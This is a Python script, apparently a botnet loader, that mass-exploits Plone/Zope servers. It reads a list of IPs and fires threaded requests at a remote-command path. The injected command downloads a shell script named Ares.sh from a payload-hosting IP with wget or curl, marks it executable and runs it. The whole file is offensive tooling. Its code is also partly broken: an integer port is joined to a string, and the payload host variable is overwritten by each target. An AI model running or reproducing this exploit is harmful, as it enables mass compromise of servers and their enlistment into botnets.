#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# MULTI AFFLICTED FIRMW VERSION PLONE < 4.0-4.0.9, 4.1, 4.2, ZOPE 2.12.x and ZOPE 2.13.x.  Exploit made by B4CKDOOR #
# B4CKDOORARCHIVE.HOST #

import threading, random, socket, time, sys, requests, re, os, subprocess

if len(sys.argv) < 3:
	print "\033[37mUsage: python "+sys.argv[0]+" <list> <port>\033[37m"
	sys.exit()

ip = "1.3.3.7" # BINS LOCATION IP
vulns = open(sys.argv[1], "r").readlines()
port = int(sys.argv[2]) # PORTS 80 8080 8081 8083
class send_payload(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			url = "http://" + self.ip + ":"+port+"/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=wget http://" + ip + "/Ares.sh; curl -O http://" + ip + "/Ares.sh; chmod +x Ares.sh; ./Ares.sh"
			requests.get(url, timeout=8)
			print "[PLONE] Loading: %s"%(self.ip)
		except:
			pass

for IP in vulns:
	try:
		ip = "".join(IP)
		ip = ip.replace("\n", "")
		t = send_payload(ip)
		t.start()
		time.sleep(0.03)
	except:
		pass #CODED BY B4CKDOOR